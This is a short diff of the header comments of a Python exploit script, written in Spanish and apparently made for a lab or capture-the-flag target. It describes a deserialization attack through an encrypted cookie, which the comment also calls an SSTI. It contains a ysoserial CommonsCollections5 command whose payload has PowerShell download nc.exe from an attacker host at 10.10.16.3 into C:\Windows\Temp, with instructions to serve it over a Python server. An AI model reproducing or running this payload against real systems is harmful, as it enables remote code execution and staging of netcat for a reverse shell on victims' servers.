@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+# Explotacion de un STTI atraves de la cookie encryptada mediante una serializacion y deserializacion de la misma. 
 # Creamos el payload con los recursos nc.exe en el mismo directorio
 # java -jar ysoserial.jar CommonsCollections5 "powershell -c iwr -uri 'http://10.10.16.3/nc.exe' -o C:\Windows\Temp\nc.exe" > payload.bin 
 # Ejecutamos el programa con un servidor python3 compartiendo el nc.exe
